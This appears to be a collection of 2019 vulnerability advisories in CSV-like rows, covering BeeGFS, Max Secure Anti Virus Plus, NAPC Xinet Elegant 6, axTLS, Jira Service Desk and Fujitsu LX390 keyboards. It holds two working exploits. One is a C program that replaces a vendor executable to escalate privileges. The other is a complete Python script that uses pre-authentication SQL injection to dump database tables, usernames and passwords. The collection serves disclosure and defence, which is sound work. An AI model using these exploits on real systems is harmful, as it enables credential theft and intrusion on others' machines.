connAuthFile = /etc/beegfs/connauthfile
The contents of the connAuthFile can be anything but must be the same on each host as this is a shared key. If this key is readable by non-root users then it will be ineffective in preventing the attacks described above (although hosts without access to the key from joining the cluster), the key must be configured readable only by root:
$ ls -la /etc/beegfs/connauthfile
-rw------- 1 root root 640 Aug 28 02:29 /etc/beegfs/connauthfile
With the connAuthFile option configured BeeGFS will derive a 64 bit key from the file containing the secret and this value is used to authenticate the communication channels when they are initially established as well as any subsequent communication channels.
When configured communications which have not first authenticated with this key are ignored and silently dropped by the BeeGFS cluster.
This mitigation does prevents non-root users from using any BeeGFS utilities (beegfs-ctl, beegfs-check-servers, etc.).
No specific fix has been provided by BeeGFS for this vulnerability, therefore updating versions of BeeGFS will (currently) not resolve this issue. The workaround described above is the official supported recommendation from BeeGFS.
The BeeGFS cloudformation templates have been updated in order to make use of a shared key.
Timeline
========
2019-08-23: Issue reported to ThinkparQ
2019-08-26: Acknowledgement from ThinkparQ
2019-09-05: Details of proposed remediation from ThinkparQ and proposed disclosure date
2019-11-17: HPCsec pre-advisory published
2019-11-19: Confirmation that cloudformation templates have been updated
2019-12-04: Advisory published
=================================================
https://www.hpcsec.com/2019/12/04/cve-2019-15897/
================================================="
143,Max Secure Anti Virus Plus v19.0.4.020 Insecure Permissions CVE-2019-19382,,CVE-2019-19382,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/MAX-SECURE-PLUS-ANTIVIRUS-INSECURE-PERMISSIONS.txt
[+] ISR: ApparitionSec
[Vendor]
www.maxpcsecure.com
[Affected Product Code Base]
Max Secure Anti Virus Plus - 19.0.4.020
File hash: ab1dda23ad3955eb18fdb75f3cbc308a
msplusx64.exe
[Vulnerability Type]
Insecure Permissions
[CVE Reference]
CVE-2019-19382
[Security Issue]
Max Secure Anti Virus Plus 19.0.4.020 has Insecure Permissions on the installation directory.
Local attackers or malware running at low integrity can replace a .exe or .dll file to achieve privilege escalation.
C:Program FilesMax Secure Anti Virus Plus>cacls * | more
C:Program FilesMax Secure Anti Virus Plus7z.dll NT AUTHORITYAuthenticated Users:(ID)F
BUILTINUsers:(ID)F
NT AUTHORITYSYSTEM:(ID)F
BUILTINAdministrators:(ID)F
[Affected Component]
Permissions on installation directory
[Exploit/POC]
#include <stdio.h>
#include <windows.h>
#define TARGET ""C:\Program Files\Max Secure Anti Virus Plus\MaxSDUI.exe""
#define TMP ""C:\Program Files\Max Secure Anti Virus Plus\2.exe""
#define DISABLED_TARGET ""C:\Program Files\Max Secure Anti Virus Plus\666.tmp""
/* Max Secure Anti Virus Plus PoC By hyp3rlinx */
BOOL PWNED=FALSE;
BOOL FileExists(LPCTSTR szPath){
DWORD dwAttrib = GetFileAttributes(szPath);
return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
void main(void){
if(!FileExists(DISABLED_TARGET)){
CopyFile(TARGET, TMP, FALSE);
Sleep(1000);
CopyFile(TMP, DISABLED_TARGET, FALSE);
printf(""[+] Max Secure Anti Virus Plus EoP PoC "");
Sleep(1000);
printf(""[+] Disabled MaxSDUI.exe ... "");
Sleep(300);
}else{
PWNED=TRUE;
}
if(!PWNED){
char fname[MAX_PATH];
char newLoc[]=TARGET;
DWORD size = GetModuleFileNameA(NULL, fname, MAX_PATH);
if (size){
printf(""[+] Copying exploit to vuln dir... "");
Sleep(1000);
CopyFile(fname, TARGET, FALSE);
printf(""[+] Replaced legit Max Secure EXE... "");
Sleep(2000);
printf(""[+] Done! "");
MoveFile(fname, ""C:\Program Files\Max Secure Anti Virus Plus\MaxPwn.lnk"");
Sleep(1000);
exit(0);
}
}else{
if(FileExists(TMP)){
remove(TMP);
}
printf(""[+] Max Secure Anti Virus Plus PWNED!!! "");
printf(""[+] hyp3rlinx "");
system(""pause"");
}
}
[POC Video URL]
https://www.youtube.com/watch?v=DXSV5geXkTw
[Network Access]
Local
[Severity]
High
[Disclosure Timeline]
Vendor Notification: November 19, 2019
Vendor: ""received a reply they will fix soon""
Status request: November 24, 2019
No replies other than automated response.
November 29, 2019 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
144,NAPC Xinet Elegant 6 Asset Library Web Interface v6.1.655 Pre-Auth SQL Injection 0Day CVE-2019-19245,,CVE-2019-19245,"[+] Credits: hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/NAPC-XINET-ELEGANT-6-ASSET-LIBRARY-WEB-INTERFACE-PRE-AUTH-SQL-INJECTION.txt
[+] ISR: ApparitionSec
[Vendor]
www.napc.com
[Product]
Xinet Elegant 6 Asset Library Web Interface v6.1.655
Web based interface for xinet asset management solution.
[Vulnerability Type]
Pre-Auth SQL Injection
[CVE Reference]
CVE-2019-19245
[Security Issue]
NAPC Xinet (interface) Elegant 6 Asset Library v6.1.655 allows Pre-Authentication Error based SQL Injection via the /elegant6/login LoginForm[username] field when
double quotes are used. The vulnerable version seems to be old, but it may still be possible to still find it deployed as I have.
Vulnerable Parameter: LoginForm[username] (POST) Method.
[Exploit/POC]
import requests,time,re,sys,argparse
#NAPC Xinet Elegant 6 Asset Library v6.1.655
#Pre-Auth SQL Injection 0day Exploit
#By hyp3rlinx
#ApparitionSec
#==============
#This will dump tables, usernames and passwords in vulnerable versions
#REQUIRE PARAMS: LoginForm[password]=&LoginForm[rememberMe]=0&LoginForm[username]=SQL&yt0
#SQL INJECTION VULN PARAM --> LoginForm[username]
#================================================
IP=""""
PORT=""80""
URL=""""
NUM_INJECTS=20
k=1
j=0
TABLES=False
CREDS=False
SHOW_SQL_ERROR=False
def vuln_ver_chk():
global IP, PORT
TARGET = ""http://""+IP+"":""+PORT+""/elegant6/login""
response = requests.get(TARGET)
if re.findall(r'Elegant"",appVersion:""6.1.655', response.content):
print ""[+] Found vulnerable NAPC Elegant 6 Asset Library version 6.1.655.""
return True
print ""[!] Version not vulnerable :(""
return False
def sql_inject_request(SQL):
global IP, PORT
URL = ""http://""+IP+"":""+PORT+""/elegant6/login""
tmp=""""
headers = {'User-Agent': 'Mozilla/5.0'}
payload = {'LoginForm[password]':'1','LoginForm[rememberMe]':'0','LoginForm[username]':SQL}
session = requests.Session()
res = session.post(URL,headers=headers,data=payload)
idx = res.content.find('CDbCommand') # Start of SQL Injection Error in response
idx2 = res.content.find('key 1') # End of SQL Injection Error in response
return res.content[idx : idx2+3]
#Increments SQL LIMIT clause 0,1, 1,2, 1,3 etc
def inc():
global k,j
while j < NUM_INJECTS:
j+=1
if k !=1:
k+=1
return str(j)+','+str(k)
def tidy_up(results):
global CREDS
idx = results.find(""'"")
if idx != -1:
idx2 = results.rfind(""'"")
if not CREDS:
return results[idx + 1: idx2 -2]
else:
return results[idx + 2: idx2]
def breach(i):
global k,j,NUM_INJECTS,SHOW_SQL_ERROR
result=""""
#Dump Usernames & Passwords
if CREDS:
if i % 2 == 0:
target='username'
else:
target='password'
SQL=('""and (select 1 from(select count(*),concat((select(select concat(0x2b,'+target+'))'
'from user limit '+str(i)+', 1),floor(rand(0)*2))x from user group by x)a)-- -')
if not SHOW_SQL_ERROR:
result = tidy_up(sql_inject_request(SQL))
else:
result = sql_inject_request(SQL)+"" ""
print ""[+] Dumping ""+target+"": ""+result
#Dump Tables
if TABLES:
while j < NUM_INJECTS:
nums = inc()
SQL=('""and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database()'
'limit '+nums+'),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -')
if not SHOW_SQL_ERROR:
result = tidy_up(sql_inject_request(SQL))
else:
result = sql_inject_request(SQL) + "" ""
print ""[+] Dumping Table... "" +result
time.sleep(0.3)
def parse_args():
parser = argparse.ArgumentParser()
parser.add_argument(""-i"", ""--ip_address"", help=""<TARGET-IP>."")
parser.add_argument(""-p"", ""--port"", help=""Port, Default is 80"")
parser.add_argument(""-t"", ""--get_tables"", nargs=""?"", const=""1"", help=""Dump Database Tables."")
parser.add_argument(""-c"", ""--creds"", nargs=""?"", const=""1"", help=""Dump Database Credentials."")
parser.add_argument(""-m"", ""--max_injects"", nargs=""?"", const=""1"", help=""Max SQL Injection Attempts, Default is 20."")
parser.add_argument(""-s"", ""--show_sql_errors"", nargs=""?"", const=""1"", help=""Display SQL Errors, Default is Clean Dumps."")
parser.add_argument(""-e"", ""--examples"", nargs=""?"", const=""1"", help=""Show script usage."")
return parser.parse_args()
def usage():
print ""Dump first ten rows of usernames and passwords""
print ""NAPC-Elegant-6-SQL-Exploit.py -i <TARGET-IP> -c -m 10 ""
print "" Dump first five rows of database tables and show SQL errors""
print ""NAPC-Elegant-6-SQL-Exploit.py -i <TARGET-IP> -t -m 5 -s ""
exit(0)
def main(args):
global TABLES,CREDS,URL,IP,NUM_INJECTS,SHOW_SQL_ERROR
if args.ip_address:
IP=args.ip_address
if args.port:
PORT=args.port
if args.get_tables:
TABLES=True
if args.creds:
CREDS=True
if args.max_injects:
NUM_INJECTS = int(args.max_injects)
if args.show_sql_errors:
SHOW_SQL_ERROR=True
if args.examples:
usage()
if vuln_ver_chk():
for i in range(0, NUM_INJECTS):
breach(i)
time.sleep(0.3)
if __name__=='__main__':
parser = argparse.ArgumentParser()
print ""NAPC Elegant 6 Asset Library v6.1.655""
print ""Pre-Authorization SQL Injection 0day Exploit""
print ""Discovery / eXploit By hyp3rlinx""
print ""ApparitionSec ""
time.sleep(0.5)
if len(sys.argv)== 1:
parser.print_help(sys.stderr)
sys.exit(0)
main(parse_args())
[Network Access]
Remote
[POC Video URL]
https://www.youtube.com/watch?v=mdw_sPlshmI
[Severity]
Critical
[Disclosure Timeline]
Vendor Notification: November 13, 2018
Second attempt: October 12, 2019
November 29, 2019 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
146,[Public Disclosure] Two Denial-of-Service vulnerabilities found in axTLS library (CVE-2019-9689 / CVE-2019-10013),,CVE-2019-9689,"Hi all,
Two Denial-of-Service vulnerabilities were found in the axTLS library (http://axtls.sourceforge.net/). Both vulnerabilities were addressed to the project maintainer in a responsible disclosure.
Because the initial deadline was prolonged a few times to fix the issues, but we didn't received any feedback since June, the vulnerability details are published now: https://www.telekom.com/en/corporate-responsibility/data-protection-data-security/security/details/advisories-504842
Affected versions: axTLS <= 2.1.5
Detailed information about both vulnerabilities:
* CVE-2019-9689: https://www.telekom.com/resource/blob/586428/51ae062269fbcb068bd20379f87f1398/dl-191121-critical-remote-denial-of-service-vulnerability-ii--data.pdf
* CVE-2019-10013: https://www.telekom.com/resource/blob/586416/12097aeb8f9a6bba89a804b94575521a/dl-191121-critical-remote-denial-of-service-vulnerability-i--data.pdf
Kind regards
Deutsche Telekom CERT
T-SYSTEMS INTERNATIONAL GMBH
Telekom Security
Cyber Defense Reponse
Bonner Talweg 100, 53113 Bonn
+49 228 18171773 (Phone)
E-Mail: mailto:cert telekom de
PGP: https://www.telekom.com/de/verantwortung/datenschutz-und-datensicherheit/sicherheit/sicherheit/rfc-2350-deutsche-telekom-cert-342710
Let's power higher performance
You can find the compulsory statement on: http://www.t-systems.com/compulsory-statement"
175,"Jira Service Desk Server and Jira Service Desk Data Center Security Advisory - 2019-11-06 - CVE-2019-15003, CVE-2019-15004",,CVE-2019-15003,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
This email refers to the advisory found at
https://confluence.atlassian.com/jira/jira-service-desk-security-advisory-2019-11-06-979412717.html
.
CVE ID:
* CVE-2019-15003
* CVE-2019-15004
Product: Jira Service Desk Server and Data Center.
Affected Jira Service Desk Server and Data Center product versions:
version < 3.9.17
3.10.0 <= version < 3.16.11
4.0.0 <= version < 4.2.6
4.3.0 <= version < 4.3.5
4.4.0 <= version < 4.4.3
4.5.0 <= version < 4.5.1
Fixed Jira Service Desk Server and Data Center product versions:
* for 3.9.x, Jira Service Desk Server and Data Center 3.9.17 has been released
with a fix for this issue.
* for 3.16.x, Jira Service Desk Server and Data Center 3.16.11 has been released
with a fix for this issue.
* for 4.2.x, Jira Service Desk Server and Data Center 4.2.6 has been released
with a fix for this issue.
* for 4.3.x, Jira Service Desk Server and Data Center 4.3.5 has been released
with a fix for this issue.
* for 4.4.x, Jira Service Desk Server and Data Center 4.4.3 has been released
with a fix for this issue.
* for 4.5.x, Jira Service Desk Server and Data Center 4.5.1 has been released
with a fix for this issue.
Summary:
This advisory discloses a critical severity security vulnerability. Versions of
Jira Service Desk Server and Data Center are affected by this vulnerability.
Customers who have upgraded Jira Service Desk Server and Data Center to version
3.9.17 or 3.16.11 or 4.2.6 or 4.3.5 or 4.4.3 or 4.5.1 are not affected.
Customers who have downloaded and installed Jira Service Desk Server and Data
Center less than 3.9.17 (the fixed version for 3.9.x) or who have downloaded and
installed Jira Service Desk Server and Data Center >= 3.10.0 but less than
3.16.11 (the fixed version for 3.16.x) or who have downloaded and installed Jira
Service Desk Server and Data Center >= 4.0.0 but less than 4.2.6 (the fixed
version for 4.2.x) or who have downloaded and installed Jira Service Desk Server
and Data Center >= 4.3.0 but less than 4.3.5 (the fixed version for 4.3.x) or
who have downloaded and installed Jira Service Desk Server and Data Center >=
4.4.0 but less than 4.4.3 (the fixed version for 4.4.x) or who have downloaded
and installed Jira Service Desk Server and Data Center >= 4.5.0 but less than
4.5.1 (the fixed version for 4.5.x) please upgrade your Jira Service Desk Server
and Data Center installations immediately to fix this vulnerability.
URL path traversal allows information disclosure - CVE-2019-15003
Severity:
Atlassian rates the severity level of this vulnerability as critical, according
to the scale published in our Atlassian severity levels. The scale allows us to
rank the severity as critical, high, moderate or low.
This is our assessment and you should evaluate its applicability to your own IT
environment.
Description:
By design, Jira Service Desk gives customer portal users permissions only to
raise requests and view issues. This allows users to interact with the customer
portal without having direct access to Jira. These restrictions can be bypassed
by a remote attacker with portal access who exploits a path traversal
vulnerability. Note that attackers can grant themselves access to Jira Service
Desk portals that have the Anyone can email the service desk or raise a request
in the portal setting enabled. Exploitation allows an attacker to view all
issues within all Jira projects contained in the vulnerable instance. This could
include Jira Service Desk projects, Jira Core projects, and Jira Software
projects.
Versions of Jira Service Desk Server and Data Center all versions before 3.9.17
(the fixed version for 3.9.x), from version 3.10.0 before 3.16.10 (the fixed
version for 3.16.x), from version 4.0.0 before 4.2.6 (the fixed version for
4.2.x), from version 4.3.0 before 4.3.5 (the fixed version for 4.3.x), from
version 4.4.0 before 4.4.3 (the fixed version for 4.4.x), and from version 4.5.0
before 4.5.1 (the fixed version for 4.5.x) are affected by this vulnerability.
This issue can be tracked at: https://jira.atlassian.com/browse/JSDSERVER-6589
.
Fix:
To address this issue, we've released the following versions containing a fix:
* Jira Service Desk Server and Data Center version 3.9.17
* Jira Service Desk Server and Data Center version 3.16.11
* Jira Service Desk Server and Data Center version 4.2.6
* Jira Service Desk Server and Data Center version 4.3.5
* Jira Service Desk Server and Data Center version 4.4.3
* Jira Service Desk Server and Data Center version 4.5.1
Remediation:
Upgrade Jira Service Desk Server and Data Center to version 4.5.1 or higher.
The vulnerabilities and fix versions are described above. If affected, you
should upgrade to the latest version immediately.
If you are running Jira Service Desk Server and Data Center 3.9.x and cannot
upgrade to 4.5.1, upgrade to version 3.9.17.
If you are running Jira Service Desk Server and Data Center 3.16.x and cannot
upgrade to 4.5.1, upgrade to version 3.16.11.
If you are running Jira Service Desk Server and Data Center 4.2.x and cannot
upgrade to 4.5.1, upgrade to version 4.2.6.
If you are running Jira Service Desk Server and Data Center 4.3.x and cannot
upgrade to 4.5.1, upgrade to version 4.3.5.
If you are running Jira Service Desk Server and Data Center 4.4.x and cannot
upgrade to 4.5.1, upgrade to version 4.4.3.
For a full description of the latest version of Jira Service Desk Server and
Data Center, see
the release notes found at
https://confluence.atlassian.com/servicedesk/jira-service-desk-release-notes-780083086.html.
You can download the latest version of Jira Service Desk Server and Data Center
from the download centre found at
https://www.atlassian.com/software/jira/service-desk/download.
Support:
If you have questions or concerns regarding this advisory, please raise a
support request at https://support.atlassian.com/.
-----BEGIN PGP SIGNATURE-----
iQJLBAEBCgA1FiEEXh3qw5vbMx/VSutRJCCXorxSdqAFAl3E4DkXHHNlY3VyaXR5
QGF0bGFzc2lhbi5jb20ACgkQJCCXorxSdqCHlhAAms1Ea3KA/TJEtsdOtlH3kw4h
1wN3Pk18v986BwDsE06pO3HsY8ra608o1Pzx++AVdLnPQU+fIBUfg2SKBIn/ACGS
7s8qKCzcveZsCnZqHJaaSNYubGxiT20QnxfBDh8tTCJzp0m5s9zdArNb4kITUsWT
pLH0gQ/cPx4Ureb8nO2JpcpU9joJdAODU7NCF+jRCmDreYJBWwROGtCnP4VPmquC
v0CsvfMAFENscvAszxAybXNG5CoiBjb0+qwJq8K6yWeu6c5kwGoh7k90Hk5JdDJm
z1MTJb6T9FTHvlmfGUfCOVFpvFtuNzFaPBhxfKaHHYlksOnXzTHztlJsi+nuojyE
FAONVh3Fcq+cL2DB/jAOxnBgcWvOIWYkgNkRFyZIZ+y09LuFTowzlShy9+RC9+0z
kH+w7HKgA0gSeJvvrgTW5BUaOklvT7wVKMmG+aEz0w32kJhPwPIgcPtIQ2uAYj9C
uJKP5FwKULoWUXMDWclrY3xMxSRL/g7bv0ZAVlGzLdtFBkr0zZexdm/FJoAr7nQU
7Et0TjVKHzr00Y0kCVO/fmN3BWK12iNrOZZ1Vo4j/u8xL7BxqqimrlN1jfv+46lt
t8LF2JwCaVV9qirrVJDj6T650aLyXdKgTYrrvJtXjCnmnhixd/t1yDcnd585iKva
xgbVIqGBDtaP+lRrsTs=
=TvXO
-----END PGP SIGNATURE-----"
187,[SYSS-2019-011]: Fujitsu Wireless Keyboard Set LX390 - Keystroke Injection Vulnerability (CVE-2019-18200),,CVE-2019-18200,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-011
Product: Wireless Keyboard Set LX390
Manufacturer: Fujitsu
Affected Version(s): Model No. GK381
Tested Version(s): Model No. GK381
Vulnerability Type: Cryptographic Issues (CWE-310)
Keystroke Injection Vulnerability
Risk Level: High
Solution Status: Open (product reached end-of-life (EOL) in May 2019)
Manufacturer Notification: 2019-04-01
Solution Date: -
Public Disclosure: 2019-10-23
CVE Reference: CVE-2019-18200
Author of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Fujitsu Wireless Keyboard Set LX390 is a wireless desktop set consisting
of a mouse and a keyboard.
The manufacturer describes the product as follows (see [1, 2]):
""The Wireless Keyboard Set LX390 is an excellent desktop solution for
users with ambition. This durable keyboard set is equipped with secure
2.4 GHz technology and plug and play technology. The elegant mouse works
on most surfaces due to its precise 1000 dpi sensor. It offers fabulous
features and ultra slim, portable design.""
Due to an insecure implementation of the data communication, the
wireless keyboard LX390 is prone to keystroke injection attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the wireless desktop set Fujitsu LX390 is
vulnerable to keystroke injection attacks, as the used data
communication is unencrypted, which is described in the SySS security
advisory SYSS-2019-010 (see [3]), and unauthenticated.
By analyzing the used radio communication protocol, the so-called data
whitening or data scrambling mechanism used by the 2.4 GHz radio
transceiver, and its configuration, an attacker is able to send
arbitrary keystrokes to a victim's computer system. In this way, an
attacker can remotely take control over the victim's computer that is
operated with an affected Fujitsu LX390 wireless desktop set.
The actual configuration for a specific targeted keyboard regarding the
used data whitening configuration can be learned by remotely analyzing
the radio communication.
In combination with the replay attack described in the SySS security
advisory SYSS-2019-009 (see [4]), a keystroke injection attack allows to
remotely attack computer systems with an active screen lock, for example
in order to install malware when the target system is unattended.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully perform keystroke injection attacks against
the Fujitsu wireless desktop set LX390 using a software-defined radio
in combination with an in-house developed software tool utilizing GNU
Radio [5].
For the protocol analysis and initial proof-of-concept attacks,
Universal Radio Hacker (URH) [6] was used.
SySS GmbH could also perform successful keystroke injection attacks
using another in-house developed software tool in combination with the
USB radio dongle Crazyradio PA and the nrf-research-firmware by Bastille
Networks Internet Security written by Marc Newlin (see [7] and [8]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The Fujitsu Wireless Keyboard Set LX390 reached its end-of-life (EOL) in
May 2019.
Fujitsu has released two new wireless keyboard sets named LX410 [9] and
LX960 [10] that are not affected by the described security issue.
SySS recommends replacing LX390 wireless keyboard sets used in
environments with higher security demands, for instance with one of the
newer successor models LX410 or LX960.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2019-04-01: Vulnerability reported to manufacturer
2019-04-02: Fujitsu confirms receipt of security advisory and asks
questions regarding the reported security issue;
answered open questions
2019-04-11: Received further questions from manufacturer
2019-04-18: Answered open questions and postponed disclosure date
2019-10-08: Reminded manufacturer of the upcoming release of the
security advisory
2019-10-18: Discussed details of coordinated disclosure with
manufacturer
2019-10-21: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Fujitsu Wireless Keyboard Set LX390 (not available anymore)
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx390.html
[2] Data sheet Fujitsu Wireless Keyboard Set LX390
https://produktinfo.conrad.com/datenblaetter/1300000-1399999/001375431-da-01-en-FUJITSU_DESKTOP_SET_WIREL_LX390_WEISS.pdf
[3] SySS Security Advisory SYSS-2019-010
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-010.txt
[4] SySS Security Advisory SYSS-2019-009
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-009.txt
[5] GNU Radio
https://www.gnuradio.org/
[6] Universal Radio Hacker (URH)
https://github.com/jopohl/urh
[7] Product website for Crazyradio PA
https://www.bitcraze.io/crazyradio-pa/
[8] Bastille's nRF24 research firmware and tools
https://github.com/BastilleResearch/nrf-research-firmware
[9] Product website for Fujitsu Wireless Keyboard Set LX410
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx410.html
[10] Product website for Fujitsu Wireless Keyboard Set LX960
https://www.fujitsu.com/global/products/computing/peripheral/accessories/input-devices/keyboards/keyboard-lx960.html
[11] SySS Security Advisory SYSS-2019-011
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2019-011.txt
[12] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Matthias Deeg of SySS GmbH.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAl2wG/sACgkQ2aS/ajSt
Tav0JRAAhRswQ+EPh6xpzSeMKSiqG1+6SpGPH+oQUPvhnpJTVY4Ypz6guxpdEgo3
B+NKfC6gCuP6z9PFjkQ62/pCZjPIh4RvP3EbN+/xaG93mAw6U5cIUOUw+ZL2kvhJ
WuO/171YTpGHhZn7nhCFRspuKm+8JVbfsAXOUyx4+VM72Kv0/t51r87IB00zqZQW
/7npG22OdNDwheUZQy6kezRGngIOfHUT/hBxptIiGRvp+K2/rNUKY6WugECWRY1W
cw8XOzayrCaPPsNhVpAXh4wCtCFczxy0i/ySX8vaWOixPYE/8ND7cA+GjeFrUaCi
Y7u9YvCuP9/oZnH7FRFFNfs3Pn2lfaAlvv5GhOxdos0AK3y1w9nO3Ltg5C9zrgND
dY3AokCLjuevIsTOpUNCXQxiNj0e1DJRyqrHdpDviD5b5uhIUaz3ZypJimLqigPR
Bp5uM8ck84ZHx94vqltzX0u7WuuD9CikbLyZpJN/A3l0IZs3yF7OBqKt7D0nfXN+
ZRD8jhSSPXvLhUJRtM1Z4mLl8AnFU90BqDgvwEI4Ry/3zmRiS0sXo2g2yeS69uBp
yi8c/Bxx/waEwnKV9UsFH0GD5KjleffOfdX7vEVKodw3Wxi2ILgn2MUAArT/b2pF
dIIayneKpY++CWrSBGiTww8HTqTcgpICZ466QHG07NIzGlKnG50=
=Jvuy
-----END PGP SIGNATURE-----"
188,[SYSS-2019-010]: Fujitsu Wireless Keyboard Set LX390 - Missing Encryption of Sensitive Data (CWE-311) (CVE-2019-18201),CWE-311,CVE-2019-18201,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2019-010
Product: Wireless Keyboard Set LX390
Manufacturer: Fujitsu
Affected Version(s): Model No. GK381
Tested Version(s): Model No. GK381
Vulnerability Type: Missing Encryption of Sensitive Data (CWE-311)
Risk Level: High
Solution Status: Open (product reached end-of-life (EOL) in May 2019)
Manufacturer Notification: 2019-04-01
Solution Date: -
Public Disclosure: 2019-10-23
CVE Reference: CVE-2019-18201
Author of Advisory: Matthias Deeg (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Fujitsu Wireless Keyboard Set LX390 is a wireless desktop set consisting
of a mouse and a keyboard.
The manufacturer describes the product as follows (see [1, 2]):
""The Wireless Keyboard Set LX390 is an excellent desktop solution for
users with ambition. This durable keyboard set is equipped with secure
2.4 GHz technology and plug and play technology. The elegant mouse works
on most surfaces due to its precise 1000 dpi sensor. It offers fabulous
features and ultra slim, portable design.""
Due to an insecure implementation of the radio data communication
without encryption, an attacker is able to remotely eavesdrop sensitive
data, for instance passwords entered via the wireless keyboard.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the wireless desktop set Fujitsu LX390 does not
use encryption for transmitting data packets containing keyboard events
like keystrokes.
However, the payload and checksum of data packets are transmitted in an
encoded way using so-called data whitening or data scrambling of the
used 2.4 GHz radio transceiver. Thus, without knowing this data
whitening mechanism and its configuration, an attacker cannot actually
gain access to the cleartext payload contents of transmitted radio
packets during a sniffing attack.
By analyzing the Fujitsu LX390 keyboard and its radio communication,
SySS was able to identify the used communication protocol, the data
whitening mechanism, and how to find the correct data whitening
configuration by sniffing the radio communication of a specific
keyboard.
With this knowledge, an attacker can remotely analyze and decode sent
keyboard events of a Fujitsu LX390 keyboard as cleartext, for instance
keystrokes, and thus gain unauthorized access to sensitive data like
passwords.
Knowing how to analyze the data communication of a Fujitsu LX390
keyboard also enabled SySS to synthesize valid data packets which
allowed for key stroke injection attacks, which are described in the
SySS security advisory SYSS-2019-011 (see [3]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully perform sniffing attacks against the
2.4 GHz radio communication of the Fujitsu LX390 keyboard using a
software-defined radio and an in-house developed software tool utilizing
GNU Radio [3].
For the protocol analysis,the software tool Universal Radio Hacker [4]
was used.
SySS GmbH could also perform successful sniffing attacks using another
in-house developed software tool in combination with the USB radio
dongle Crazyradio PA and the nrf-research-firmware by Bastille Networks
Internet Security written by Marc Newlin (see [6] and [7]).
The following output of the developed PoC software tool illustrates a
successful keystroke sniffing attack.
# python3 fujitsu_lx390_sniffer.py -l -p ""3b:5b:53:bd:43"" -c 28
_ __ _ _ ____ _ __ __
| |/ /___ _ _ ___| |_ _ __ ___ | | _____ / ___| _ __ (_)/ _|/ _| ___ _ __
